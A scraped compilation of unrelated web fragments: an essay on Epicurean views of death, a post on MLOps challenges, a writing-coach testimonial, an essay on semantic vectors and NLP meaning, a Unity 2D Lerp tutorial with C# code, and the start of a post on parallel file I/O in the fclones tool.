<p>But death itself â€“ not the process of dying, which is something different â€“ doesnâ€™t seem to be the sort of thing that one can reasonably be fearful of because it isnâ€™t anything. Itâ€™s not uncomfortable or hurtful to <em>be</em> dead. Itâ€™s not as if youâ€™re being deprived of life or of more contented years because, again, you simply arenâ€™t <em>there</em> to be deprived in the first place. For you, there is nowhere to locate the harm of being dead since being dead isnâ€™t a state of being. Itâ€™s not something that strictly speaking happens to you and so it canâ€™t be harmful. (No one would say St Francis of Assisi is <em>more</em> dead than the punk rocker â€˜GGâ€™ Allin because St Francis died longer ago.) Death is the absence of an event; itâ€™s not a happening or a thing at all because there isnâ€™t such a thing as you any longer. Even something that you dreamed or imagined â€“ say, a stranger standing silently by your bed as you wake â€“ has a kind of existence necessary for it to be the reasonable object of a fear, even if it turns out to have been the shadow of a tree. Death itself doesnâ€™t have this quality. And Lucretius would add: it is just as unreasonable to fear nonexistence after life as it is to fear nonexistence before birth.</p>
<p>This is the heart of Epicurusâ€™ and Lucretiusâ€™ argument for why there is no good reason to fear death. Note that their argument doesnâ€™t speak to the fear that others will die, which is a perfectly reasonable anxiety and one that we should …</p></div></div></section></div></div>

<div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Using machine learning models in products is hard. Most companies fail at extracting value from them because they can't operationalize models properly.</p>
<!--more-->
<p>We have gotten good at creating models and iterating on them, but <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/"><span>most companies still don't use them well</span></a>. A model with acceptable performance that you can use is better than a great model that you can't. Then why are companies having so many issues leveraging them?</p>
<p>In this blog post, we show that some challenges are analogous to those before DevOps. We’ll also show that others introduce a new level in the development and operation process that requires a new stack.</p>
<p>The lessons here come from building ML products and platforms at companies like Twitter, NVIDIA, Cloudera, Google, and others. These companies have invested heavily in building their in-house ML platforms or external products for a variety of scenarios.</p>

<h2><span>Moving development closer to operations</span></h2>
<p>Two decades ago, software development was painful. Developers and operators were silos, and making any changes was an adventure. DevOps helped us fix that with a simple shift in mindset: developers should own their software end-to-end, and operators should support them. Operators could focus on building robust IT infrastructure instead of handling each application individually. Meanwhile, developers could speed their development practices by using the tools as their product demanded. This change was the first wave of operationalization, and it changed how we do software.</p>
<p><img src="https://lh5.googleusercontent.com/AzBl9kIU1PCLQLTZQ91tKPpn7bAmjghns_vNHPdloZ-V3XytDuyTemoZn96xA_QEgwuxrVG5vxqSBFixSx2hEtOhiawWdwQ_Ix7TYS_sQ1A5pxbrFhGtT4cWw7rewEymlJqtQ1ya" width="453" height="283"></p>
<p><span>Around the same time, data started to become more relevant via analytics. The goal was to understand the data companies had available. Seeing the success of DevOps, analytics professionals partnered with their operators to create DataOps. In this case, analysts could focus on their business use case while operators made their use reliable.</span></p>
<p><span>Today, machine learning faces a similar challenge. The goal of ML is to help products make decisions on the spot. For example, which messages to show from a search query. These applications focus on actively improving the business instead of just providing insights. However, these more complex applications also have requirements we had never seen, and the operations world is just starting to adjust.</span></p>
<p><span>We now face a similar challenge for model developers that we have encountered before in software development:</span></p>
<ul>
<li><span>Data scientists don't own their work end-to-end. Instead, they send their models to a software developer and data engineer to build the machinery on a case by case basis.</span></li>
<li><span>Data scientists are frequently blocked, waiting for other developers to help them.</span></li>
<li><span>Data scientists are blind to the processes required to satisfy operations until it's too late. In which case, the work is dropped or re-done.</span></li>
</ul>
<h2><span>Why MLOps is so hard</span></h2>
<p><span>Using ML models in products is a quantum leap in their value, and every such significant change comes with paradigm shifts. Not only MLOps is hard on itself, but most companies are not prepared to practice it today if done naively. The challenges of adopting MLOps boils down to:</span></p>
<ul>
<li><span>You have to support multiple pre-existing tools in two isolated ecosystems;</span></li>
<li><span>Models have more dimensions in their requirements, and operate on a broader range of each trade-off;</span></li>
<li><span>You need to provide a self-service ecosystem for data scientists that currently don't have the operations skills that developers do;</span></li>
<li><span>Companies' processes on using ML must start where they're at today and adapt as their use advances;</span></li>
<li><span>ML adds an entirely new layer to the operations stack.</span></li>
</ul>

<h4><span>MLOps challenge 1: pre-existing ecosystems</span></h4>
<p>Software development and model development have pretty mature ecosystems today, with constant and fast improvements. However, these ecosystems are mostly isolated. Consider a core piece of infrastructure: the workflow system. Software engineers will most likely use Jenkins, GitLab, CircleCI, or any similar tools. However, data scientists use Airflow, Kubeflow, and other ML-targeted workflow systems. These two ecosystems might eventually combine, but this can take years and a lot of effort. Instead, we need to meet them where they are today.</p>

<p><img src="https://lh4.googleusercontent.com/GV0KR8tRUGnuk80NmXXCdUuZPwkoupXwKLisbeq2e8-wpmyqjKY0CMMmx6QwafOC61QboUsIC58ZegUYS4hSrfM8VO1Gbv7fgULTyuFPcH14hM_uQGgp1kFchIqQFEfJsAapbInQ" width="277" height="305"></p>
<p>From the data scientist's perspective, they need the infrastructure to be reliable. It should work in the way that they want almost always and provide all the functionality they want to use but not develop. The researcher isn't concerned with which tools achieve this goal, as long as it works with their current solutions.</p>
<p>On the other hand, IT provides a vibrant ecosystem of productivity tools, but they require applications to behave in a particular way. The challenge operators face with data science today is that adapting all those practices to the ML ecosystem is difficult and time-consuming. So they need the ML applications to look like applications they already support.</p>
<p>This golden standard is hard to achieve. Therefore most companies end up with multi-year migration projects that change how everyone does their job simultaneously. As you can imagine, these projects fail most of the time. Instead, we need to figure out how to get these two personas to collaborate first and get value from each other.</p>

<h4><span>MLOps challenge 2: dimensions of model requirements</span></h4>
<p>In modern software development, the system's requirements are usually pretty narrow, so tools can be more focused. Models not only have more dimensions, but the placement of a solution is also fuzzier.</p>
<p><img src="https://lh6.googleusercontent.com/6emah1WRzYxr97IHXpSJzKyeweuXtc3weSwUWtwBrXYJpVhg3keKrtaH_OszAh_Y6UYcaTXYX_OuqPw8DpncM_VmISOvpy58jzleK1VWUoMWV0nezh2doT64UeF0B-gvBwS_UhWX" width="487" height="426"></p>
<p>These are just a few examples of standard dimensions considered and it’s by no means an exhaustive list. Note how software usually lies on clear points in the spectrum. For instance, you know if the application provides an HTTP endpoint or runs in the user's device. Unsurprisingly, that is generally not the case for models. During the lifecycle of the model, from conception to use in a product, the same model might be at different places in the requirements balance. Using the same example, we might not use the end device for computing our test metrics due to speed concerns, but use the model as a library instead.</p>
<p>Most companies start to deploy models by building a solution for a particular case and ignoring others. Then they patch it a little bit to adapt to another model or another use case of the same model. And again, until they end up with a system that is hard to use, change, and maintain.</p>
<p>In which case, new users might consider it's easier to build their own from scratch for their use case. That's how many companies, including big tech ones, end up with multiple internal ML platforms if they're not careful. Keeping in mind the diversity of requirements, even within a single project, is an essential but challenging effort.</p>

<h4><span>MLOps challenge 3: self-service operations for data scientists</span></h4>
<p>One of the core tenets of DevOps is that developers should own their applications end-to-end. To do this properly, operators needed to provide mechanisms for their users to self-service. It allows IT to scale to multiple customers and removes delays waiting on someone else to provide some tooling.</p>

<p><img src="https://lh6.googleusercontent.com/hcT3ffqnaPw9OltYcczXKEgqjt2IHm1xB0O6vuPt2THWRmkHK62dKJ3dwdlm2UajB3mdtN4RskM3CbCJ_L9nh0cU-1pA56x9PtBziPQitU28STuw5NQMpJXaBXOxZFlQmfHLEr1i" width="499" height="326"></p>
<p>The image above covers a few of the functionalities most companies will have in their self-service platform. IT provides tools and processes for core functionalities, focusing on providing a solid foundation. Meanwhile, developers define customizations on top of the platform or perform integration for their particular application. Companies have been reducing the distance between developers and operators for many years now, which allowed lower-level constructs to be used. However, that is not enough for researchers.</p>
<p><img src="https://lh6.googleusercontent.com/4zjcm39V61mB1y4PWkJvzrrkHAVzBG6R9KKwChTHJUe81tr87ppMc2aq1DrppBgbnUXdkbJWVQUvQP0PdMlk5xpMZommxEkhKsSxmWoaZLoQ_lrv4yE2a3dFGnv79oguFTUL4yqD" width="499" height="326"></p>

<p>As we have argued before, data scientists' current skill set is very distinct from bringing up and operating one of their models in production. Hence the platform provided for researchers needs to be at a higher level than for software developers. For example, developers know how to define their systems' behavior to ensure it meets a particular SLA. But data scientists want to specify what those SLAs are and rely on a platform to handle the complexities to achieve that.</p>
<p>Thankfully the industry started to make higher-level constructs available for software engineers too. As anybody would suspect, operating low-level definitions is a considerable overhead. However, the further away you get from the specifics, the more domain knowledge you need to embed in the platform. Unfortunately, not every operations team has this knowledge at hand to support ML applications.</p>

<h4><span>MLOps challenge 4: adapt to existing processes and grow with the company</span></h4>
<p>Every big software company has a set of processes in place for software development. These processes took years and many iterations to develop correctly, potentially including expensive mistakes. When thinking about using models in production, teams frequently face the challenge of building these processes from scratch.</p>

<p><img src="https://lh5.googleusercontent.com/755p1w0mxyZwNwQFrwm_C2OLPIfMS-OAoOrRN5DjfAx2Z_70kHhNRvDRQk4L-Ygu3bnZRBkweEyRrtr8AlGKKQVQFFES7-yXnceVLGkI8VkBLNVh5yhrn5eyNDjmNTcrUvw_Yky9" width="452" height="285"></p>

<p>However, at the start of the ML journey, most operations constraints will look similar to doing software engineering. Operationalizing ML has higher success at places that first adapt their current processes the best they can. Once they have that initial version, the team iterates on the process as they identify improvements related to the new application domain or new product requirements.</p>
<p>This evolution of processes means that platforms and infrastructure must be able to adapt along with their teams. As new regulations and customer requests evolve, so will the requirements and limitations on model development and execution. Switching to a new system every time that happens is expensive. But relying on external enforcement is prone to misalignment failures. Hence production ML needs to meet users where they are today to bring immediate value while supporting the evolution of their ML methodologies.</p>

<h4><span>MLOps challenge 5: new layer at the operations stack</span></h4>
<p>This challenge is potentially the most undervalued one for MLOps: adding models creates an entirely new layer to the operations stack. In a simplified way, each level of the operation stack covers the unit of computation, how …</p></span></p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ff90fafa3d7cc2ce1565"><div><p>The best athletes in the world have personal trainers: LeBron James, Serena Williams, Megan Rapinoe. I knew that to be the best, I needed to hire a writing coach to take me to the next level.</p><p>As a species, we have a monopoly on collective knowledge. So engaging with a mentor or a coach is one of the best ways to become smarter. A good friend referred me to his writing coach, who lives outside the Cleveland region. Now I value a good referral, but I also value relationships — and we've got plenty of expertise in this region. In Cleveland, relationships remain key — over the course of the pandemic, and long after.</p><p>I wanted to become an even better writer simply to see where it would take me. I enlisted the help of Randal Doane at&nbsp;<a href="https://cadence-editorial-neo.com/about/" target="_blank">Cadence Editorial Services</a>. (He works with clients in medtech and biotech, and he has a side hustle contributing to&nbsp;<a href="https://harpers.org/author/randaldoane/" target="_blank">Harper's</a>.) Randal's based on the west side, and his knowledge of the region and some of its key players allowed us to talk at a high level about things well beyond split infinitives and paragraph breaks. He is also knowledgeable about a range of topics, which is apparently what happens when you have a Ph.D.</p><p><strong>How did it work?</strong></p><p>To begin, our process entailed:</p><ul data-rte-list="default"><li><p>my delivery via Google Docs of essays to Randal on Monday and Wednesday by 11 a.m.</p></li><li><p>a Zoom chat at 3 p.m. those days, which included line-by-line discussions of my draft, with a focus on pop, voice and formatting</p></li><li><p>work on my social media voice, and in particular Twitter</p></li></ul><p>Before connecting with Randal, I published nine essays a month: eight for my newsletter and one for Crain's Cleveland Business. In that period, I learned quickly that quantity doesn't equal quality.</p><p><strong>Key tips</strong></p><p>We covered, of course, the obvious things. Make verbs active. Use the historical present. Put subheads to work, because some readers will simply scan your article. "Be honest about your own attention limits," Randal also advised. "If it takes you 20 minutes to get into a writing head space, don't schedule a 30 minute writing session. You're just building frustration into your process." Randal also taught me how to split quotes and put the speaker's name in the middle.</p><p>I'd be lying if I told you I'm on a schedule, but it's definitely getting better. Typically, I'd write from 10 p.m. to 1 a.m. (Yes, I'm a night owl. It works for me. Per Randal's suggestion, I wrote this essay on a Monday morning. A huge accomplishment for me!)</p><p>Next, on Randal's recommendation, I downloaded&nbsp;<a href="http://www.hemingwayapp.com/" target="_blank">the Hemingway app</a>. This app helps you make your writing more succinct. If you want to be a better writer, download it.</p><p>Writing isn't only about words. It's about appearance, too. So what's the best way to engage readers in the attention economy? I started crafting multiple headlines and subheads and using bold words strategically. I also aim to ensure that every sentence delivers value. With my essays on branding and digital platforms, I aim to deliver reader-friendly, thought-provoking content every time.</p><p>Once I finished my first draft, I'd read it aloud. What a difference that makes. "Your ear will pick up things your eye scans past," Randal noted. Awkward phrasing, subject-verb disagreement, and run-on sentences: You name it, I wrote it, and now my ear knows better. In my defense: My mom served as my proofreader for ages, so I was pretty lazy about proofreading.</p><p>Finally, I'd send it to Randal. His edit focused on the Cs of writing: clarity, concision and cadence. We'd connect by phone and Google Docs and, on an unmarked copy of the essay, he would introduce his suggestions one by one. Every time Randal dropped a knowledge bomb, I scooped it up, defused it, and either applied it right then or filed it away for future engagement.</p><p>So what did the finished product look like?</p><p><strong>The results</strong></p><p>Right away, I saw how my writing improved, and my readers took notice, too. "These pieces are getting better and better," one reader wrote. "I find myself wanting more though. Ever thought about bringing them up to 750-1000 words instead of what seems like 450-650?" I think a big part of it was sentence length. With Randal's help, I trimmed median sentence length by 27% and still increased the variety of sentence lengths by 12%.</p><p>Wow! Not only was I enjoying the writing more, my readers wanted me to write longer pieces. My list of subscribers kept growing, too. In the month and a half I worked with Randal, my newsletter list increased by 49%. My open rate is solid, too, and 170 new people signed up to read my writing twice a week.</p><p>But the biggest accomplishment was from my mom. The self-described "perfectionist" was always supportive of my work, but definitely critical. As a proofreader in her past life, she was obsessed with finding the mistakes. By the end of my coaching boot camp with Randal, she complimented me on how much my writing had improved.</p><p><strong>More than just words on the page</strong></p><p>Our work entailed more than writing. It included work on my personal brand. Randal kept asking: Who is Ari Lewis? Why does he write? Who is his audience?

    <div><p>Would we be as successful as we are now? I'd say no.</p>
<h3 id="what-are-semantic-vectors">What are Semantic Vectors</h3>
<p>But first, what does it even mean to communicate with vectors? Communication can be defined as the transfer of an idea from one person to another, and a semantic vector essentially tries to capture an idea in a numerical representation. Vectors have grown vastly in popularity in Natural Language Processing in the past decade, and now virtually all research in the field revolves around a basic assumption that vectors can effectively convey ideas.</p>
<p>The first commonly used semantic vector model, generally known as word embedding (as in embedding a word in a vector space), was <a href="https://en.wikipedia.org/wiki/Word2vec">word2vec</a> in 2013. Word2vec learns vector representations of words by encouraging words that occur in similar contexts to have similar vector representations. So, for example, if we have a corpus with examples like "the dog chased the cat", "the canine chased the cat", and "the rat feared the cat", word2vec would learn to represent "dog" and "canine" with similar embeddings. The generated vectors are generally hundreds of dimensions, but the embeddings for "dog", "canine", and "rat" in our example might look something like [0.3, 0.1, 0.8], [0.3, 0.2, 0.8], and [0.4, 0.6, 0.7], respectively. Notice the similarity of "dog" and "canine" due to occurrence in similar contexts in our corpus.</p>
<p>These were known as "distributional embeddings", because they were found to distribute semantic categories across vector dimensions. A commonly cited example points out how if you subtract the word embedding for "man" from "king", and then add "woman", you get "queen". So these high-dimensional vectors that learn word representations just from context are able to pretty accurately understand the relationships between words. Sure, they might not know what a king looks like, what he does, and his historic relevance, but they do know that he's similar to a man in some ways and similar to a queen in other ways.</p>
<h3 id="word-relations-and-differance">Word Relations and Différance</h3>
<p>These relations are what many of us will resort to when asked about the structure of language. A dictionary, after all, just refers us to other words when asked for any definition. The implicit conclusion here that without grounding in the real world, all words are purely relational, bears striking resemblance to <a href="https://en.wikipedia.org/wiki/Differance">Derrida's Différance</a>. The core of Différance, which became fundamental to Deconstruction and the Postmodernism that now dominates humanities, is the idea that words gain meaning only through their difference with (and deference to) others. Only in the real world, with speech, outside of the realm of paper, would Derrida acknowledge that an uttered symbol can present real meaning.</p>
<p>But virtually all Machine Learning research in Natural Language Understanding focuses on written text, so can any real meaning be derived? Again, I'd say no. All the colossal Deep Learning architectures that seem to dominate NLP these days don't actually understand language—they've just learned correlations between words in manners ultimately quite similar to the original word2vec. This is quite obvious with <a href="https://arxiv.org/abs/2005.14165">OpenAI's GPT-3</a>, which is able to produce text that sounds very realistically written by a human, but doesn't form any coherent meaning. The model has essentially memorized all the relationships between words from a huge corpus of internet text, but it can't know what those words mean without some kind of grounding in the physical world.</p>
<p>Some meanings can be largely summed up in these simple vector relationships, but others are quite a bit more complex. The relationship between "predator" and "prey", for example, is abstract enough that I'd pretty confidently say their meanings can be captured in some kind of vector representation. But the relationship between "knife" and "onion"? You as a reader probably know how those words are related, but I can't even begin to capture the nature of their relationship in language. Yes, we can "cut an onion with a knife" (and <a href="https://transformer.huggingface.co/doc/gpt2-large">GPT-2</a>) is actually capable of predicting "knife" here), but how does this action actually work? What is the purpose it serves? What do the words really mean?</p>
<h3 id="grounding-meaning">Grounding Meaning</h3>
<p>But we might be confusing two things here. Though these language models learn the meanings of words through their relationships and co-occurence with one another, we can think about definitions on their own as well. A classic example from Indian philosophy is that of the pot. What does it mean to be a pot? As humans, we're great at generating <a href="https://en.wikipedia.org/wiki/Theory_of_forms">Platonic Forms</a> from our real world experiences. Once we've seen a few pots, our brains are able to construct a pretty accurate generalized Form for pots, and when we see one again, we're easily able to recognize that it's another instance of this Form. This representation our brain learns is so much more information dense than what can be gleaned from language. It's imbued with an innate understanding of visual and physical attributes.</p>
<p><a href="https://arxiv.org/abs/1810.04805">Google's BERT</a> might read an article about pots and then tell us that pots are often made of clay, can be used as cooking vessels, and have been found in China from 20,000 BC. But ask BERT whether a pot with holes would be able to hold water and it'd have no idea. This could certainly be construed as a language issue instead of a grounding issue. Maybe we could find some more textual data that relates pots to holes and holes to water so that BERT can learn better semantic representations for them. The real solution to me though, would be to ground the language model in the physical world, perhaps with some kind of Reinforcement Learning strategy. If a picture is worth a thousand words and a video is worth a million, the ability to interact with a physical environment must carry a tremendous amount of semantic information.</p>
<h3 id="composing-and-comprehending-meaning">Composing and Comprehending Meaning</h3>
<p>While grounding is vital for learning accurate word representations, something even more elementary to me is the <a href="https://en.wikipedia.org/wiki/Principle_of_compositionality">compositionality of language</a>. Compositionality is the idea that the meaning of a sentence is a unique, synergistic result of combining the constituent words within it. It's closely related to Noam Chomsky's <a href="https://en.wikipedia.org/wiki/Recursion#In_language">Recursion</a>, which he asserts is the fundamental element underlying all human language. Recursion is the ability for us to infinitely nest expressions in language, much like this very sentence, where I can just continue chaining on clauses, again and again, until I desire to stop, at which point I may place a period in writing, or a pause in speech, and then continue on to present yet another idea.</p>
<p>And upon the conclusion of that sentence, there is a moment of understanding, where the meaning that I intend to express bursts forth in its entire form in your mind. Bhartrhari, an Indian linguistic philosopher of the 5th century, termed this "bursting forth" as "<a href="https://en.wikipedia.org/wiki/Sphota">sphoṭa</a>". The symbols, whether as letters on paper or sounds in speech, agglomerate together to create a unified meaning that is entirely comprehended in a single moment. Later on, the Mimamsakas built on this idea to emphasize that a sphoṭa is not indivisible as originally conceptualized, but rather is the result of the hierarchical composition of sounds, words, and clauses through grammatical structures.</p>
<p>The ability to compose words to generate coherent moments of understanding is vital to language in my opinion, and I'm skeptical of the ability of word vector embeddings to do this effectively. There has certainly been progress on this front in ML with <a href="https://arxiv.org/abs/1706.03762">Transformer architectures</a>. Previously, RNNs dominated the NLP landscape. These neural nets linearly process language one word at a time, feeding the collective representation of the sentence so far forward until an entire representation is outputted at the end.</p>
<p>The problem here, of course, is the severe loss of information due to the lack of syntax trees. While you may not actively think about parsing syntax trees of sentences, it's an essential prior for proper understanding of any language. Some languages like Japanese put their verbs at the end of the sentence ("cat mouse chased") whereas others like English put our verbs between the subject and object ("cat chased mouse"). It might seem trivial, but syntax has wide-reaching consequences for language understanding. If you were reading a text in an Object-Verb-Subject language ("mouse chased cat") without knowledge of the syntax and the consequent relations constructed in the sentence, you'd be very confused.</p>
<p>An interesting side-note here is that speakers of left-branching languages (which put the verb at the end of a clause) have been <a href="https://www.nature.com/articles/s41598-018-37654-9">shown</a> to have better short-term memories than right-branching speakers. This is theorized to be because speakers must maintain the multiple elements in their memory for longer before their related together by the verb. In a right-branching language, the sphoṭa builds from a subject, to the subject's relationship, to the subject's relationship to the object. But with a left-branching language, one first perceives the sphoṭa of the subject, remembers it while perceiving the sphoṭa of the object, then composes those sphoṭas in the final verbal relation.</p>
<p>The true nature of a sentence is more like a graph/network or a tree, and the fact that we communicate it linearly is more of an evolutionary hack we've developed to speak out of our single mouth. So when attentional models and Transformers came along, they blew RNNs out of the water because they were implicitly capable of understanding tree structures. The attention mechanism of a Transformer is much what it sounds like, it learns to pay attention to the right things at the right time. When given a sentence "the cat chased the mouse", for the first "the" it might attend to "cat", and for "chased" it might attend to "cat" and "mouse" in unique ways (which are the verb's subject and object). Attention learns how to correctly identify the syntax relationships for sentences, thereby arriving at better semantic representations.</p>

<p>Welcome to this Unity 2D Lerp Tutorial. The Unity 2D Lerp function is often used to move objects along a path or to change values along a path. </p>



<p>However in essence LERP is code word for Linear Interpolation, but what is linear interpolation?</p>



<p>Well interpolation is a mathematical concept which is used to fit points within other points.</p>



<p>Essentially how this works is it takes a set of points and estimates other points for a given x or y value on a graph. </p>



<h2>Visually explaining Lerp</h2>



<p>Here is essentially what this would look like.</p>



<figure><img loading="lazy" width="570" height="400" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-41.png" alt="Unity 2D Lerp Tutorial - Linear interpolation graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20570%20400'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-41.png"></figure>



<p>To explain this in brief. The green dots are all the co ordinates that are known.</p>



<p>The red one is a estimation of what the point will look like at that given x or y. So how Lerp works in unity is it will use the first point you give it and the 2nd point you give. </p>



<p>It and create estimations for the time value you pass in. By doing so you can get linear values back between the point 1 and point 2. </p>



<p>With these values you can modify scales, object positions etc, anything that has a linear motion or change. </p>



<p>Here is what the Lerp function definition looks like.</p>



<p>public static&nbsp;<strong>Lerp</strong>(Vector2&nbsp;<strong>a</strong>,&nbsp;Vector2&nbsp;<strong>b</strong>, float&nbsp;<strong>t</strong>);</p>



<p>So in terms of our graph Vector2 a could be the first green dot at the bottom of our graph and Vector2 b could be our last one at the top. </p>



<p>The float t, will move us along on the x axis and give us estimates of the line drawn between Vector a and Vector b. </p>



<p>In so doing if we step the time in our Lerp function we would be able to animate, move or modify unity game object.</p>



<p>I hope this makes sense. Can be quite tricky without a mathematical background. </p>



<p>You might begin to understand it more in depth with the following demonstrations.</p>



<h2>Demonstrating unity lerp between two positions</h2>



<p>Let’s start off with a new unity project. Open up unity hub and create a project called unity 2d lerp tutorial.</p>



<figure><img loading="lazy" width="815" height="386" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-42.png" alt="Demonstrating unity lerp translate" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20815%20386'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-42.png"></figure>



<p>So generally when we say translate in the same sentence as lerp we talking about different things really. </p>



<p>Lerp will give us the next co ordinate in our series, where translate will add values to our vector. </p>



<p>It technically would be possible to simulate a lerp with translate. By using a linear function to determine the gradient of our linear graph. </p>



<p>However let us stick to the lerp way of doing a “translate”. This will be using the time function. Let’s start by adding a basic square to our scene.</p>



<p>So in the assets tab add a square 2d sprite like this.</p>



<figure><img loading="lazy" width="748" height="500" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-43.png" alt="unity lerp between two positions tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20748%20500'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-43.png"></figure>



<p>Drag it into your hierarchy.</p>



<figure><img loading="lazy" width="306" height="114" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-44.png" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20114'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-44.png"></figure>



<p>Let’s now create the first basic c# script to handle a “translate”. Go ahead and right click in the assets tab and create a new c# script and call it translate lerp.</p>



<figure><img loading="lazy" width="853" height="446" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-45.png" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20853%20446'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-45.png"></figure>



<figure><img loading="lazy" width="146" height="153" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-46.png" alt="unity lerp translate tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20146%20153'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-46.png"></figure>



<p>Open that up in visual studio code. Here is what our code is going to look like.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TranslateLerp : MonoBehaviour
{
    // Start is called before the first frame update
    float accum = 0.0f;
    Vector2 p1, p2;
    void Start()
    {
         p1 = new Vector2(0, 0);
         p2 = new Vector2(20, 20);
        
    }

    // Update is called once per frame
    void Update()
    {
        accum += 1.1f * Time.deltaTime;
        this.transform.position = Vector2.Lerp(p1,p2, accum);
    }
}
</code></pre>



<p>Save that off and attach that to our square by dragging it into the insepector.</p>



<figure><img loading="lazy" width="365" height="447" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-47.png" alt="unity lerp smooth tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20365%20447'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-47.png"></figure>



<p>Run that and you should get a square moving on the screen. So very simple how this works. </p>



<p>First we have our two vectors point 1 and point 2. We then lerp between the two passing the lerp function our deltaTime * 1.1f. The 1.1f which is our speed at which we want to move our object. </p>



<p>We assign this to a accum variable which is our lerp float over time. </p>



<h2>Modifying this code to lerp scale</h2>



<p>All we now need to do to get unity lerp to scale is change the code to have this instead.</p>



<pre><code lang="csharp">this.transform.localScale = Vector2.Lerp(p1,p2, accum);</code></pre>



<figure><img loading="lazy" width="402" height="255" src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-48.png" alt="unity lerp scale tutorial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20402%20255'%3E%3C/svg%3E" data-lazy-src="https://q5q6q2e3.stackpathcdn.com/wp-content/uploads/2020/04/image-48.png"></figure>



<h2>Unity lerp smooth step</h2>



<p>Want to smooth out the motion try this.</p>



<pre><code lang="csharp">using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TranslateLerp : MonoBehaviour
{
    // Start is called before the first frame update
    float accum = 0.0f;
    Vector2 p1, p2;
    void Start()
    {
         p1 = new Vector2(0, 0);
         p2 = new Vector2(20, 20);
        
    }

    // Update is called once per frame
    void Update()
    {
        accum += 1.1f * Time.deltaTime;
        this.transform.position = Vector2.Lerp(p1,p2, Mathf.SmoothStep(0,1,accum));
    }
}
</code></pre>



<p>Here we use Mathf.SmoothStep to control the estimation.</p>



<p>That’s it for this tutorial. Going to end it here and in the next section I will be answering some frequently asked questions. </p>


        <section>
            <div>
				<h2>How do I do a smooth lerp in unity?</h2>                <p>

	        <section>
            <div>
				<h2>How do I do lerp on scale in unity?</h2>                <p>
						To lerp on scale in unity you can simply provide 2 vectors and lerp over the localScale like this.<br>accum += 1.1f * Time.deltaTime;<br>this.transform.localScale = Vector2.Lerp(p1,p2, accum);                    </p>
            </div>

            <div>
				<h2>How do I do a translate lerp in unity?</h2>                <p>
						You can lerp between two points like this.<br>accum += 1.1f * Time.deltaTime;<br>this.transform.position= Vector2.Lerp(p1,p2, accum);                    </p>
            </div>

  <p>One of the well-known ways of speeding up a data processing task is partitioning the data into smaller
chunks and processing the chunks in parallel. Let’s assume we can partition the task easily, or the input data is already 
partitioned into separate files which all reside on a single storage device. Let’s also assume the algorithm we run on those
data is simple enough so that the computation time is not a bottleneck. How much performance can we gain by reading the files in parallel? 
Can we lose any?</p>

<p>While working on <a href="https://github.com/pkolaczk/fclones">fclones</a> duplicate file finder,
I’ve put a lot of effort into making it as fast as possible by leveraging capabilities of modern hardware.
That’s why I designed my program in a way that all data processing stages can be easily parallelized. 
The newest version at the moment of writing this post (0.7.0) allows to set thread pools for random I/O 
and sequential I/O separately, and can adapt the settings to different types of storage devices.</p>

<p>In this blog post I’m presenting the results of a few experiments I’ve made separately on SSD and HDD.
All the experiments were perfomed on either a Dell Precision 5520 laptop with a 4-core Xeon and a 512 NVMe SSD, from 2016, 
running Ubuntu Linux 20.04, or an older Dell M4600 with a 7200 RPM Toshiba HDD running Mint Linux 19.03.</p>


<p>The most time-consuming part of the job is actually reading
the data from disk into memory in order to compute hashes. The number of files is typically large (thousands or even millions) 
and the problem of computing their hashes is embarrassingly parallel. 
The first thing my duplicate finder does is scanning directory tree and fetching file metadata like file lenghts and inode identifiers. 
This process issues a lot of random I/O requests. As expected, the performance gains from multithreading were huge, 
which is illustrated in Fig.&nbsp;1.</p>

<div>
    
    
    <p><span> Fig.1: Time to fetch metadata of ~1.5 million file entries on an SSD</span>
</p></div>

<p>In the next stage, the files matching by size are compared by hashes of their initial 4 kB block. This involves a lot of random I/O as well – 
for each file, <code>fclones</code> opens it, reads the first 4 kB of data, computes the hash and closes the file, then moves to the next file. 
SSDs are great at random I/O, and high parallelism level leads to big wins here as well (Fig.&nbsp;2). It was surprising to me
